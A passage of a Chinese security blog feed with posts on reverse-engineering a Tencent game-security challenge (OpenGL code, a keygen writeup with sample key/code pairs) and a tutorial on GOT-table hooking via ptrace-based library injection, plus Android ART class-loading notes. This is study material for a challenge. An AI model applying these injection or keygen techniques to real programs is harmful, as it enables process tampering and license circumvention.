id="VBO-顶点缓冲对象"><a href="#VBO-顶点缓冲对象" class="headerlink" title="VBO(顶点缓冲对象)"></a>VBO(顶点缓冲对象)</h3><p>顶点缓冲对象VBO是在显卡存储空间中开辟出的一块内存缓存区，用于存储顶点的各类属性信息，如顶点坐标，顶点法向量，顶点颜色数据等。在渲染时，可以直接从VBO中取出顶点的各类属性数据，由于VBO在显存而不是在内存中，不需要从CPU传输数据，处理效率更高。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static void CreateVertexBuffer()</span><br><span class="line">&#123;</span><br><span class="line">    // 创建含有一个顶点的顶点数组</span><br><span class="line">    Vector3f Vertices[1];</span><br><span class="line">    // 将点置于屏幕中央</span><br><span class="line">    Vertices[0] = Vector3f(0.0f, 0.0f, 0.0f);</span><br><span class="line"></span><br><span class="line">    // 创建缓冲器</span><br><span class="line">    glGenBuffers(1, &amp;VBO);</span><br><span class="line">    // 绑定GL_ARRAY_BUFFER缓冲器</span><br><span class="line">    glBindBuffer(GL_ARRAY_BUFFER, VBO);</span><br><span class="line">    // 绑定顶点数据</span><br><span class="line">    glBufferData(GL_ARRAY_BUFFER, sizeof(Vertices), Vertices, GL_STATIC_DRAW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Shader-着色器"><a href="#Shader-着色器" class="headerlink" title="Shader(着色器)"></a>Shader(着色器)</h3><p>图形渲染管线接受一组3D坐标，然后把它们转变为你屏幕上的有色2D像素输出。图形渲染管线可以被划分为几个阶段，每个阶段将会把前一个阶段的输出作为输入。所有这些阶段都是高度专门化的（它们都有一个特定的函数），并且很容易并行执行。正是由于它们具有并行执行的特性，当今大多数显卡都有成千上万的小处理核心，它们在GPU上为每一个（渲染管线）阶段运行各自的小程序，从而在图形渲染管线中快速处理你的数据。这些小程序叫做着色器(Shader)。</p><p>在so中的init区段初始化了着色器代码。<br><img src="/2018/05/04/mtp2/15262922120545.jpg" alt="0-w500"></p><p><img src="/2018/05/04/mtp2/15262922381037.jpg" alt="1-w500"></p><p><code>sub_30604(v23);</code>函数中完成了对着色器的创建和编译绑定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GLuint ShaderProgram = glCreateProgram(); </span><br><span class="line">GLuint ShaderObj = glCreateShader(ShaderType); </span><br><span class="line">glShaderSource(ShaderObj, 1, p, Lengths); </span><br><span class="line">glCompileShader(ShaderObj); </span><br><span class="line">glAttachShader(ShaderProgram, ShaderObj); </span><br><span class="line">glUseProgram(ShaderProgram); </span><br></pre></td></tr></table></figure><p>详细解释参考：<a href="https://blog.csdn.net/cordova/article/details/52495077">https://blog.csdn.net/cordova/article/details/52495077</a></p><p>图形渲染管线的每个阶段的抽象展示。要注意蓝色部分代表的是我们可以注入自定义的着色器的部分。<br><img src="https://pic4.zhimg.com/80/v2-1e286dd517c717e3f1c48792275f7e87_hd.jpg"><br>摘自：<a href="https://www.zhihu.com/question/29163054">https://www.zhihu.com/question/29163054</a></p><h3 id="贴图纹理"><a href="#贴图纹理" class="headerlink" title="贴图纹理"></a>贴图纹理</h3><p>为了实现纹理贴图我们需要做三件事：<br>将一张贴图加载到OpenGL中<br>提供纹理坐标和顶点（将纹理对应匹配到顶点上）<br>并使用纹理坐标从纹理中进行取样操作取得像素颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sub_2F79C(*(_DWORD *)(*(_DWORD *)(v10 + 12) + 32), &quot;textures/container.jpg&quot;, &amp;v42);</span><br><span class="line">...</span><br><span class="line">sub_30604(v23);</span><br><span class="line">dword_AA108 = v23;</span><br><span class="line">_aeabi_memcpy8(&amp;v48, dword_A1AA0, 720);</span><br><span class="line">glGenVertexArrays(1, &amp;v38);</span><br><span class="line">glGenBuffers(1, &amp;v39);</span><br><span class="line">glBindVertexArray(v38);</span><br><span class="line">glBindBuffer(0x8892, v39);</span><br><span class="line">glBufferData(0x8892, 720, &amp;v48, 35044);</span><br><span class="line">glVertexAttribPointer(0, 3, 0x1406, 0, 20, 0);</span><br><span class="line">glEnableVertexAttribArray(0);</span><br><span class="line">glVertexAttribPointer(1, 2, 5126, 0, 20, 12);</span><br><span class="line">glEnableVertexAttribArray(1);</span><br><span class="line">glGenTextures(1, &amp;textures);</span><br><span class="line">glBindTexture(0xDE1u, textures);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2802u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2803u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2801u, 9729);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2800u, 9729);</span><br><span class="line">pixels = (const GLvoid *)sub_31578(v42, v43, &amp;v35, &amp;v34, &amp;v33, 0);</span><br><span class="line">      if ( pixels )</span><br><span class="line">      &#123;</span><br><span class="line">        glTexImage2D(0xDE1u, 0, 6407, *(GLsizei *)&amp;v35, v34, 0, 0x1907u, 0x1401u, pixels);</span><br><span class="line">        glGenerateMipmap(3553);</span><br><span class="line">      &#125;</span><br><span class="line">      j_j_free(pixels);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>将<code>textures/container.jpg</code>作为贴图纹理，<code>dword_A1AA0</code>为顶点数组（顶点数组是<strong>顶点</strong>中的截图），得到的结果就是一个立方体（以三角形为单位渲染，6* 2 *3=36）。</p><p>函数详解参考：<a href="https://blog.csdn.net/cordova/article/details/52825859">https://blog.csdn.net/cordova/article/details/52825859</a></p><h3 id="帧缓冲区"><a href="#帧缓冲区" class="headerlink" title="帧缓冲区"></a>帧缓冲区</h3><h3 id="glUniform函数"><a href="#glUniform函数" class="headerlink" title="glUniform函数"></a>glUniform函数</h3><p>uniform修饰符可以指定一个在应用中设置好的变量，它不会在图元处理的过程中发生变化，且在所有的着色阶段之间都是共享的——着色器中的全局变量。</p><p>详细参考：<a href="https://www.cnblogs.com/android-blogs/p/5454692.html">https://www.cnblogs.com/android-blogs/p/5454692.html</a></p><p><code>sub_30098(int a1)</code>函数中对顶点的x、y坐标处理后会调用到<code> sub_30EEC(int *a1, int a2, int a3)</code>,这个函数里就包含了<code>glGetUniformLocation(v5, v4);</code>和<code>j_glUniformMatrix4fv(v6, 1, 0, v3);</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全技术移动平台资格题writeup</title>
    <link href="https://f4ncy.top/2018/04/23/mtp-mobile-1/"/>
    <id>https://f4ncy.top/2018/04/23/mtp-mobile-1/</id>
    <published>2018-04-22T17:36:08.000Z</published>
    <updated>2019-02-25T05:05:17.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="腾讯游戏安全技术移动平台资格题writeup"><a href="#腾讯游戏安全技术移动平台资格题writeup" class="headerlink" title="腾讯游戏安全技术移动平台资格题writeup"></a>腾讯游戏安全技术移动平台资格题writeup</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目要求输入key和code，匹配则会显示“success！”，否则显示“fail！”。<br>有standard和advance两个版本，advance比standard多一个函数，这里时间原因只做到了standard版本，最近每周都有ctf。</p><h3 id="key相关"><a href="#key相关" class="headerlink" title="key相关"></a>key相关</h3><blockquote><p>key只能是数字，字母a(A)～f(F)，如果是小写，会被转为大写。<br>将keystr以”#”间隔，拆分，放入vector<br>sub_4864将keystr 拆分为8块，校验每块长度不为0<br>最后会对每块取值运算，要求每块4字节，所以结构是<code>****#****#****#****#****#****#****#****</code></p></blockquote><p>sub_496C函数传入keystr，生成5个int64，用于后面校验。</p><p>生成规则脚本里有，不作详解。大概就是每次运算取vector中两个项中各一字节，参与指定运算。前两个还算有规律，后面就没什么规律了。关于这里的代码，似乎是经过混淆，循环被平坦化了。</p><p>脚本是python的，所以对数据的类型处理不是很好，可能存在bug。好尴尬。</p><h3 id="code相关"><a href="#code相关" class="headerlink" title="code相关"></a>code相关</h3><blockquote><p>输入长度需要是偶数<br>长度需要是44（由生成数据的长度决定）<br>最后12字符确定()（由生产数据的最后9字节决定）<br>最后以”=”结束</p></blockquote><p>sub_7114函数传入codestr，生成一个vector，用于后面校验。</p><p>每4字节生成3字节数据，根据字节在已知字符串<code>&quot;ZO6Kq79L&amp;CPWvNopzQfghDRSG@di*kAB8rsFewxlm+/u5a^2YtTJUVEn0$HI34y#=&quot;</code>中的位置来确定数。</p><blockquote><p>block[0]<del>block[1]-&gt;result[0]<br>block[1]</del>block[2]-&gt;result[1]<br>block[2]~block[3]-&gt;result[2]</p></blockquote><p>最后生成44/4*3=33字节数据</p><blockquote><p>v11[3] != 0x32303138</p></blockquote><p>决定生成的数据最后8字节，值为(int64)0x0000000032303138<br>由生成规则爆破（爆破代码在脚本注释中）得到“pKqE”、“NeZZ”、“ZZZ”。</p><p>所以code最后12字节为“pKqENeZZZZZ=”</p><h3 id="验证函数"><a href="#验证函数" class="headerlink" title="验证函数"></a>验证函数</h3><p>sub_5658传入key生成的5个int64数和code生成的前24字节数据。</p><p>参数作为8个int64参与运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( ((a6 * a1 + a2) * a6 + a3) ^ a7 )        // ((S[0]*v18+v17)*S[0]+v16)==S[1]</span><br><span class="line">    return 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  if ( (a2 - a4) * (a2 - a4) == 4 * a1 * (a6 * a4 + a3 - a7) &amp;&amp; a8 == a3 + (a5 * a1 + a2 - a4) * a5 )</span><br><span class="line">    v8 = 1;                                     // (v17-v15)*(v17-v15)==4*v18*(S[0]*v15+v14-S[1])</span><br><span class="line">                                                // S[2]==v16+(v14*v18+v17-v15)*v14</span><br></pre></td></tr></table></figure><p>将code生成的数据当作未知数，整理数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=(4*CH18*CH18)</span><br><span class="line">b=(4*CH18*(CH17-CH15))</span><br><span class="line">c=((CH17-CH15)*(CH17-CH15))</span><br><span class="line"></span><br><span class="line">#b**2==4*a*c</span><br><span class="line">#4*CH18*(CH17-CH15)*4*CH18*(CH17-CH15)==4*4*CH18*CH18*(CH17-CH15)*(CH17-CH15)</span><br></pre></td></tr></table></figure><p>可整理为一个二元一次方程。且delta=0，所以有唯一解。</p><h2 id="注册机编写思路"><a href="#注册机编写思路" class="headerlink" title="注册机编写思路"></a>注册机编写思路</h2><p>要求由输入key来计算code，key可以生成5个int64，通过还原程序的计算过程，将5个数计算出来。此时验证函数中，把code的数据当作未知数，已有系数，由整理得到的方程解出S[0],再计算得出S[1],S[2]。</p><blockquote><p>S[0]，S[1]，S[2]分别数code生成的前24字节组成的3个int64</p></blockquote><p>得到code生成的数据后，反推code输入，已经知道了code的生成规则，和之前得到code的最后12个字节一样，爆破处理，每4字节生成3字节数据，那么就3字节3字节处理。</p><p>每3字节得到4字节输入，24/3*4=32，加上已知的12字节，32+12=44，正好输入44字节。</p><h3 id="注册机使用"><a href="#注册机使用" class="headerlink" title="注册机使用"></a>注册机使用</h3><p>脚本测试环境：Python 2.7.14<br>MYKEY设置成key，注意格式。<br>运行脚本即可，最后输出的结果即是code.</p><p>几组跑出来的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ab1D#2BCE#A41B#EA2A#B3CD#8A0A#AB31#0FF0</span><br><span class="line">dn57ZfZZZZK^wxgp$FhxiamNJlIRtD20pKqENeZZZZZ=</span><br><span class="line"></span><br><span class="line">1b1D#2BCE#141B#EA2A#13CD#8A0A#1B31#0FF0</span><br><span class="line">ynoJZZZZZZK^wFr#*kEHd#uT&amp;3YdEUsBpKqENeZZZZZ=</span><br><span class="line"></span><br><span class="line">AAAA#bbbb#1111#cccc#defa#3333#4317#98f1</span><br><span class="line">OEH46EZZZZZwJYDWiCe*v0Fd@Gqo5zR9pKqENeZZZZZ=</span><br></pre></td></tr></table></figure><p>截图：<br><img src="/2018/04/23/mtp-mobile-1/success.jpg" alt="success-w400"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>GOT表hook</title>
    <link href="https://f4ncy.top/2018/04/08/GOTHOOK/"/>
    <id>https://f4ncy.top/2018/04/08/GOTHOOK/</id>
    <published>2018-04-08T15:51:17.000Z</published>
    <updated>2019-02-25T05:06:53.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="GOT表hook"><a href="#GOT表hook" class="headerlink" title="GOT表hook"></a>GOT表hook</h1><p>&emsp;&emsp;ELF文件中，GOT表和PLT表，不同映像间的函数和数据引用都是通过它们实现的。GOT（全局偏移表）给出了映像中所有被引用符号（函数或变量）的值。每个普通PLT表项相当于一个函数的桩函数（stub），支持懒绑定的情况下，当发生对外部函数的调用时，程序会通过PLT表将控制交给动态连接器，后者解析出函数的绝对地址，修改GOT中相应的值，之后的调用将不再需要连接器的绑定。由于linker是不支持懒绑定的，所以在进程初始化时，动态链接器首先解析出外部过程引用的绝对地址，一次性的修改所有相应的GOT表项。对共享对象来说，由于GOT，PLT节以及代码段和数据段之间的相对位置是固定的，所有引用都是基于一个固定地址（GOT）的偏移量，所以实现了PIC代码，重定位时只需要修改可写段中的GOT表。而可执行程序在连接过程中则可能发生对不可写段的修改。如果只读段和可写段不是以固定的相对位置加载的，那么在重定位是还需要修改所有指向GOT的指针。</p><h2 id="本地hook"><a href="#本地hook" class="headerlink" title="本地hook"></a>本地hook</h2><h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p>&emsp;&emsp;我们需要了解一下ELF文件的结构，因为我们得到GOT表地址是通过ELF文件格式中的字段来一步步索引的。<br>&emsp;&emsp;索引过程为：从ELFHeader里找到字符串表，因为要找节表是通过名称来搜索的，所以首先要字符串表的地址。<br><strong>ELFHeader</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf32_hdr &#123;</span><br><span class="line">  unsigned char e_ident[EI_NIDENT];</span><br><span class="line">  Elf32_Half e_type;</span><br><span class="line">  Elf32_Half e_machine;</span><br><span class="line">  Elf32_Word e_version;</span><br><span class="line">  Elf32_Addr e_entry;</span><br><span class="line">  Elf32_Off e_phoff;</span><br><span class="line">  Elf32_Off e_shoff;</span><br><span class="line">  Elf32_Word e_flags;</span><br><span class="line">  Elf32_Half e_ehsize;</span><br><span class="line">  Elf32_Half e_phentsize;</span><br><span class="line">  Elf32_Half e_phnum;</span><br><span class="line">  Elf32_Half e_shentsize;</span><br><span class="line">  Elf32_Half e_shnum;</span><br><span class="line">  Elf32_Half e_shstrndx;</span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>Elf32_Ehdr.e_shoff:节区头表偏移<br>Elf32_Ehdr.e_shstrndx:字符串表在节区头表中的索引<br>Elf32_Ehdr.e_shentsize:每个节区头大小</p><p>字符串表偏移：Elf32_Ehdr.e_shoff+Elf32_Ehdr.e_shstrndx*Elf32_Ehdr.e_shentsize</p><p>节区头表名称来源有里之后，就可以遍历节区头表了。</p><p>节区头表偏移：Elf32_Ehdr.e_shoff</p><p><strong>ELFSectionHeader</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf32_shdr &#123;</span><br><span class="line">  Elf32_Word sh_name;</span><br><span class="line">  Elf32_Word sh_type;</span><br><span class="line">  Elf32_Word sh_flags;</span><br><span class="line">  Elf32_Addr sh_addr;</span><br><span class="line">  Elf32_Off sh_offset;</span><br><span class="line">  Elf32_Word sh_size;</span><br><span class="line">  Elf32_Word sh_link;</span><br><span class="line">  Elf32_Word sh_info;</span><br><span class="line">  Elf32_Word sh_addralign;</span><br><span class="line">  Elf32_Word sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>sh_name:节区名称在字符串表中的偏移<br>sh_type:节区类型</p><p>通过判断类型值和节区名称来确定GOT表节区</p><p>最后获取到模块加载地址后作为基址，加上偏移即是GOT表地址，GOT表就是一个地址表，通过遍历挨个地址匹配，找到后修改即可，注意修改内存页权限。（不知道为什么GOT在内存中是没有可写权限的）<br><img src="/2018/04/08/GOTHOOK/15232059915351.jpg"><br>在地址0xb6f2af54处</p><p>代码地址：<a href="https://github.com/Minxin/gothooklocal">https://github.com/Minxin/gothooklocal</a></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>&emsp;&emsp;在测试中发现一些问题，程序在调用函数时，特别在多次调用时，会将函数指针存放在寄存器中，供下一次调用使用，这个时候无论修改何处，寄存器中的值是不变的，每次调用形式为：<code>BLX  R4</code>.所以这样hook是没有任何效果的。<br>&emsp;&emsp;写在其他函数中，调用就会正常，间接跳转的形式，GOT修改后生效。<br><img src="/2018/04/08/GOTHOOK/15232067018523.jpg" alt="result-w500"></p><p>可以看到GOT修改之后，<code>just 2</code>和<code>just 3</code>是通过寄存器跳转的，没有效果；<code>for test</code>是通过间接跳转的，生效。</p><h2 id="远程hook"><a href="#远程hook" class="headerlink" title="远程hook"></a>远程hook</h2><p>相比较的话，多了一步注入操作。 </p><p>注入程序参照：<a href="https://blog.csdn.net/qq1084283172/article/details/46859931">https://blog.csdn.net/qq1084283172/article/details/46859931</a><br><strong>注入流程：</strong><br><img src="http://gslab.qq.com/data/attachment/portal/201604/27/153304u2qgl1wax4ntlrzs.png" alt="injectflow-c"></p><h3 id="注入方案："><a href="#注入方案：" class="headerlink" title="注入方案："></a>注入方案：</h3><p>我们将上面实现的本地hook代码编译成动态库，把这个库注入到目标进程，然后调用hook函数，那么需要目标程序调用dlopen函数来装载库，调用dlsym来获取到hook函数地址，最后调用。并且这些函数需要的参数我们也需要写入目标进程的地址空间中，所以还需要mmap来开出一块地址空间开写入参数数据。</p><p>获取函数地址，我们计算一下偏移即可：<br><code>remote_func_addr=local_func_addr+(remote_base-local_base)</code></p><p>获取本模块内存基址和目标模块的内存基址，差值即为某函数在本地地址和目标地址的偏移。</p><h3 id="基址获取："><a href="#基址获取：" class="headerlink" title="基址获取："></a>基址获取：</h3><p>在<code>/proc/[pid]/maps</code> 中查找模块名，对应行的起始地址就是模块的基址。</p><h3 id="开辟空间："><a href="#开辟空间：" class="headerlink" title="开辟空间："></a>开辟空间：</h3><p>调用mmap得到一块地址空间，mmap函数定义<br><code>void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);</code><br>调用前需要构造参数。</p><h3 id="参数设置："><a href="#参数设置：" class="headerlink" title="参数设置："></a>参数设置：</h3><p>arm中参数存放在r0～r3及栈中，超出四个参数，就需要用栈存放。</p><p>利用ptrace设置布置好的参数列表，跳转到函数的话，直接设置pc值即可。</p><p>mmap调用后需要获得返回值，返回值是开辟出的地址空间的地址，返回值是存放在r0中的，PTRACE_GETREGS获取寄存器，取出r0即可。</p><h3 id="装载hook库："><a href="#装载hook库：" class="headerlink" title="装载hook库："></a>装载hook库：</h3><p>调用dlopen将指定的库装载进目标进程中<br><code>void * dlopen( const char * pathname, int mode);</code></p><p>这里由于参数是指针，是一个地址，进程中没有需要的字符串，所以需要将字符串写入目标进程中，之前mmap申请的空间派上用场了，使用PTRACE_POKETEXT/PTRACE_POKEDATA写入指定地址即可，注意字节数量。</p><p>dlopen调用后返回装载的库的句柄，也需要获取。</p><h3 id="获取函数地址："><a href="#获取函数地址：" class="headerlink" title="获取函数地址："></a>获取函数地址：</h3><p>调用dlsym获得hook函数的地址<br><code>void* dlsym(void* handle,const char* symbol)</code><br>这里的符号参数也需要写入目标内存中，用ida打开so，可以看它的导出符号。</p><p>dlsym的返回值就是hook函数的地址，也需要获取。</p><p>最后再调用hook函数即可。</p><p>其实hook函数的获取可以使用计算偏移的方式，注入程序自己也装载动态库，获取hook函数地址后，加上基址差值，也可以得到hook函数在目标进程中的地址。可以不用让目标程序调用dlsym。</p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>注入程序：<br><img src="/2018/04/08/GOTHOOK/15232917260881.jpg" alt="inject-w500"></p><p>被注入程序：<br><img src="/2018/04/08/GOTHOOK/15232917491072.jpg" alt="tobehook-w500"></p><p>被注入程序首先在被hook前调用puts，进入sleep，启动注入进程，完成注入和hook后，输出的信息和之前本地hook的输出差不多，最后继续执行，再次调用puts时，已经被myputs代替，输入信息前有前缀”FAKE:”。</p><p>代码地址：<a href="https://github.com/Minxin/gothookremote">https://github.com/Minxin/gothookremote</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>android虚拟机（二）</title>
    <link href="https://f4ncy.top/2018/04/03/androidVM2/"/>
    <id>https://f4ncy.top/2018/04/03/androidVM2/</id>
    <published>2018-04-03T09:31:07.000Z</published>
    <updated>2018-04-04T18:21:04.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="android虚拟机（二）"><a href="#android虚拟机（二）" class="headerlink" title="android虚拟机（二）"></a>android虚拟机（二）</h1><h2 id="ART虚拟机加载流程"><a href="#ART虚拟机加载流程" class="headerlink" title="ART虚拟机加载流程"></a>ART虚拟机加载流程</h2><p>summary up <a href="https://blog.csdn.net/luoshengyang/article/details/39533503">https://blog.csdn.net/luoshengyang/article/details/39533503</a></p><p>需要先了解：<br><a href="https://blog.csdn.net/lusing/article/details/52453246">ART中几个组件</a><br><a href="https://blog.csdn.net/briblue/article/details/54973413">java中的ClassLoader</a></p><p>&emsp;&emsp;AndroidRuntime类会对mJavaVM和JNIEnv进行创建，利用JNI接口，就可以获取到mJavaVM的入口类，并通过这个入口进入虚拟机内部，开始运行。<br>&emsp;&emsp;这个入口类是com.android.internal.os.ZygoteInit，通过JNI提供的FindClass和GetStaticMethodID函数就能获取到入口类的静态成员函数main，在由JNI提供的CallStaticVoidMethod就可以调用获取到的main函数，进入虚拟机内部。</p><p>JNI类的静态成员函数FindClass：</p><p>ClassLoader<br><code>Handle&lt;mirror::ClassLoader&gt;class_loader(hs.NewHandle(GetClassLoader(soa)));</code></p><p>need to get the instance of Runtime from the current Thread，then we can get the ClassLinker by Runtime-&gt;getClassLinker.</p><p>ClassLinker<br>1⃣️-&gt;FindClass<br>2⃣️-&gt;FindSystemClass</p><h3 id="FindClass："><a href="#FindClass：" class="headerlink" title="FindClass："></a><strong>FindClass：</strong></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class_loader.<span class="built_in">Get</span>() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// The boot class loader, search the boot class path.</span></span><br><span class="line">    ClassPathEntry pair = <span class="built_in">FindInClassPath</span>(descriptor, boot_class_path_);</span><br><span class="line">   <span class="keyword">if</span> (pair.second != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">DefineClass</span>(descriptor, NullHandle&lt;mirror::ClassLoader&gt;(), *pair.first, *pair.second);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   ...</span><br><span class="line">   </span><br></pre></td></tr></table></figure><ol><li>如果要找的类是基础类型，则直接调用FindPrimitiveClass查找基础类型；如果不是则在传入的ClassLoader的已加载类表中查找类(首先会判断ClassLaoder是否为null，如果为null,就在boot_class_table_中查找，否则就在ClassLoader自己的ClassTable中查找)，如果找到，确保类已经被解析并返回</li><li>如果在传入的ClassLoader的已加载类表中没有找到类,则首先判断ClassLoader是否为空，如果为空，在boot_class_path_（系统启动类路径）中查找，如果不为空，则调用FindClassInPathClassLoader在传入的ClassLoader以及它的各级parent中查找类</li><li>如果仍然没有找到，则调用传入的ClassLoader的loadClass在传入的ClassLoader中查找，找到返回，否则抛出异常</li></ol><p>copy from <a href="https://www.jianshu.com/p/29b580e452a1">here</a></p><h3 id="DefineClass："><a href="#DefineClass：" class="headerlink" title="DefineClass："></a><strong>DefineClass：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mirror::Class* ClassLinker::DefineClass(const char* descriptor,</span><br><span class="line">                                       Handle&lt;mirror::ClassLoader&gt; class_loader,</span><br><span class="line">                                       const DexFile&amp; dex_file,</span><br><span class="line">                                       const DexFile::ClassDef&amp; dex_class_def)&#123;</span><br><span class="line">                                       ...</span><br></pre></td></tr></table></figure><ol><li>ClassLinker是否已经初始化完成（在初始化时会创建一些内部类）</li><li>未初始化完成时，loadClass内部类或为类allocclass分配空间再loadClass</li><li>LoadClass从dex中加载类，并通过InsertClass添加到已加载类列表中（在其他线程同时在加载该类时，通过EnsureResolved确保同步）</li><li>LinkClass来对加载后的类进行解析，类解析完后得到一个Class对象</li></ol><h3 id="LoadClass："><a href="#LoadClass：" class="headerlink" title="LoadClass："></a><strong>LoadClass：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void ClassLinker::LoadClass(const DexFile&amp; dex_file,  </span><br><span class="line">                            const DexFile::ClassDef&amp; dex_class_def,  </span><br><span class="line">                            SirtRef&lt;mirror::Class&gt;&amp; klass,  </span><br><span class="line">                            mirror::ClassLoader* class_loader) &#123;</span><br><span class="line">                            ...</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">dex_file</td><td align="left">类型为DexFile，描述要加载的类所在的DEX文件</td></tr><tr><td align="left">dex_class_def</td><td align="left">类型为ClassDef，描述要加载的类在DEX文件里面的信息</td></tr><tr><td align="left">klass</td><td align="left">类型为Class，描述加载完成的类</td></tr><tr><td align="left">class_loader</td><td 